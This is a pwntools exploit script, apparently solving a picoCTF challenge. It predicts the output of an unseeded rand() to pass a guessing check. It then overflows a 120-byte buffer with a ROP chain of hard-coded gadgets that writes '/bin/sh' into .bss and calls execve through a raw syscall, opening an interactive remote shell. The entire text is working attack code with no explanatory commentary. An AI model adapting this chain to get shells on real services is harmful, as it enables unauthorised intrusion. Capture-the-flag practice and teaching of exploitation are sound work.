from pwn import *
from ctypes import CDLL

p = remote('shape-facility.picoctf.net', 50780)
e = ELF('./vuln')
libc = CDLL('libc.so.6')

bss = e.bss()

string = "/bin/sh\x00"
POP_RDI = 0x00000000004006a6
POP_RAX = 0x00000000004005af
POP_RSI = 0x0000000000410b93
POP_RDX = 0x0000000000410602
MOV = 0x00000000004360d3 # mov qword ptr [rdi], rdx ; ret
SYSCALL = 0x000000000040138c 
systemcall_num = 59
address = ""
padding = b'A' * 120
value = libc.rand() % 100
value += 1
p.recvuntil(b'?\n')
p.sendline(str(value).encode())
p.recvuntil(b'? ')
payload = padding + p64(POP_RDI) + p64(bss) + p64(POP_RDX) + string.encode() + p64(MOV) + p64(POP_RAX) + p64(59) + p64(POP_RSI) + p64(0) + p64(POP_RDX) + p64(0) + p64(SYSCALL)
p.sendline(payload)
p.interactive()

